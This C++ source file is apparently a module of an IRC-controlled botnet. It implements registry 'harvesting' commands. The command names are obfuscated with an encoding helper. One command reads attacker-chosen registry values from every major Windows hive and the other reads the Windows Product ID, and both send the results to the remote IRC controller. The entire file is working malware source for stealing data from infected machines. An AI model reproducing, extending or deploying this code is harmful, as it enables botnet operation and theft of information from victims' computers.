
#include "main.h"
#include "mainctrl.h"
#include "harvest_registry.h"

void CHarvest_Registry::Init()
{
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRegistry,		dp(7,5,20,79,18,5,7,0),	this); 
    g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdWindowsKeys,	dp(7,5,20,79,23,11,0),	this);

}

bool CHarvest_Registry::HandleCommand(CMessage *pMsg)
{	
	if(!pMsg->sCmd.Compare(m_cmdRegistry.sName.CStr()))
	{
	#ifdef WIN32
		HKEY hkey=NULL; 
		DWORD dwSize=128; 
		unsigned char szDataBuf[128];
		// HKEY_CURRENT_USER
		LONG lRet=RegOpenKeyEx(HKEY_CURRENT_USER, pMsg->sChatString.Token(1, " ", false).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", false).CStr(), NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"HKCU: %s", szDataBuf);
		RegCloseKey(hkey);
		// HKEY_LOCAL_MACHINE
		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pMsg->sChatString.Token(1, " ", false).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", false).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"HKLM: %s", szDataBuf);
		RegCloseKey(hkey);
		// HKEY_CURRENT_CONFIG
		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_CONFIG, pMsg->sChatString.Token(1, " ", false).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", false).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"HKCC: %s", szDataBuf);
		RegCloseKey(hkey);
		// HKEY_CLASSES_ROOT
		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CLASSES_ROOT, pMsg->sChatString.Token(1, " ", false).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", false).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"HKCR: %s", szDataBuf);
		RegCloseKey(hkey);
		// HKEY_USERS
		dwSize = 128; lRet = RegOpenKeyEx(HKEY_USERS, pMsg->sChatString.Token(1, " ", false).CStr(), 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, pMsg->sChatString.Token(2, " ", false).CStr(), NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"HKU: %s", szDataBuf);
		RegCloseKey(hkey);
	#endif
	}
	else if(!pMsg->sCmd.Compare(m_cmdWindowsKeys.sName.CStr()))
	{
	#ifdef WIN32
	    HKEY hkey=NULL; 
		DWORD dwSize=128; 
		unsigned char szDataBuf[128];
			dwSize = 128; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hkey);
			if(RegQueryValueEx(hkey, "ProductId", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
					"Found Windows Product ID (%s).", szDataBuf);
			RegCloseKey(hkey); 
		
	#endif
	}
	return true; 
}
